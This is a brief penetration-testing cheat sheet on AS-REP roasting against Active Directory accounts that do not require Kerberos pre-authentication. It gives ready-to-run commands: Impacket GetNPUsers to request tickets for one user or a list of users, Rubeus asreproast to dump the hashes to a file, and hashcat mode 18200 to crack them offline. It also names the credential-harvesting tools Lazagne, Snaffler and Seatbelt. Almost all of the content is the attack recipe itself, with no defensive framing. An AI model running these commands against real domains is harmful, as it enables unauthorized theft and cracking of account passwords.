### Occurs when a user account has the privilege "Does not require Pre-Authentication" set.

### This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

#### Impacket-GetNPUsers.py domain.com\john.doe -no-pass (Retrieves a TGT)

### You can also do:

#### 1) Gather domain accounts in a list

#### 2) python3 Impacket-GetNPUsers.py -dc-ip DC_IP DOMAIN/USER -userfile /tmp/list.txt

### More tools:

#### 1) Snaffler

#### 2) Lazagne

#### 3) Seatbelt

# Asreproasting

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `.\Rubeus.exe asreproast /outfile:asrep.txt`                 | Used to perform the Asreproast attack and save the extracted tickets to a file. |
| `hashcat -m 18200 -a 0 asrep.txt passwords.txt --force`      | Uses `hashcat` to crack AS-REP hashes that were saved in a file. |

